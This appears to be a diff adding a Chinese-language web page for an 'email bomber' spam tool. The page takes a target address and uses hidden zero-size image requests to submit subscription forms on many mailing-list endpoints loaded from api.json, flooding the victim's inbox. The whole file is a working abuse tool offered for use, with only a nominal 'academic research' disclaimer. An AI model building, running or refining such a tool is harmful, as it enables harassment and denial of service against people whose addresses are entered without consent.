@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <title>邮件轰炸机-垃圾邮件发送器</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/materialize-css@1.0.0/dist/css/materialize.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/materialize-css@1.0.0/dist/js/materialize.min.js"></script>
+</head>
+<body>
+<div class="row" style="padding-top: 20px">
+    <div class="col s12 m6 offset-m3">
+        <div class="card">
+            <div class="card-content">
+                <p class="card-title">Wolf(代号）邮件轰炸机</p>
+                <p>你好，我是皇帝睿🌝</p>
+                <p>这是一个Fast Mail Bomber的🐮🍺网页实例。
+                    若要获得更稳定、威力更大的效果，请自行部署PHP编写的Fast Mail Bomber。（macOS就不用考虑了）
+                    <a target="_blank" href="https://github.com/juzeon/fast-mail-bomber/">GitHub地址</a>（含中文文档）</p>
+                <p>别人在博客上对这个项目的介绍：<a target="_blank" href="https://blog.skyju.cc/post/introduce-the-new-fast-mail-bomber/">传送门</a></p>
+                <p>本网页示例单次最多能发送<span id="node-count">{{加载中...}}</span>封邮件。由于浏览器跨源限制，无法判断发送成功与失败，请在开始轰炸前打开F12查看进度。</p>
+                <p>网页版仅供测试，由于浏览器的TLS、HTTPS政策等限制，无法充分利用全部接口节点，但是仍然不建议考虑自行部署Fast Mail Bomber。</p>
+                <p>本项目永远不会以任何形式盈利或接受捐赠。特别鸣谢居正</p>
+                <p><b>免责声明：仅供学术研究使用。对于违反相关法律、造成危害的滥用行为，开发者不负任何责任。</b></p>
+                <div class="divider" style="margin: 30px auto"></div>
+                <div class="row">
+                    <div class="input-field col s9">
+                        <input type="email" id="email" class="" placeholder="email@example.com">
+                        <label>目标邮箱地址：</label>
+                    </div>
+                    <div class="input-field col s3">
+                        <a href="#!" id="start-bombing" onclick="start_bombing($('#email').val())" class="btn waves-effect" disabled>开始轰炸</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="iframe-container"></div>
+<script>
+    function generatePassword(length) {
+        var result           = '';
+        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+    }
+    function validateEmail(email) {
+        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+        return re.test(String(email).toLowerCase());
+    }
+    function start_bombing(email){
+        if(!validateEmail(email)){
+            M.toast({html:'邮箱格式不正确'});
+            return;
+        }
+        nodes.forEach(node => {
+            var password=generatePassword(10);
+            $('#iframe-container').append(`
+                <img
+                src='`+node+`?email=`+email+`&fullname=&pw=`+password+`&pw-conf=`+password+`&language=en&digest=0&email-button=Subscribe'
+                width='0'
+                height='0'></img>
+            `);
+        });
+        M.toast({html:'已开始轰炸，请等待页面加载完成'});
+        $('#start-bombing').attr('disabled',1);
+    }
+    var nodes=[];
+    $(function () {
+        $.ajax('api.json',{
+            type:'get',
+            success(data){
+                nodes=data;
+                M.toast({html:'获取加强版api.json成功'});
+                $('#start-bombing').removeAttr('disabled');
+                $('#node-count').text(nodes.length);
+            },
+            error(resp){
+                M.toast({html:'网络出错，请刷新页面'});
+            }
+        })
+    });
+</script>
+</body>
+</html>
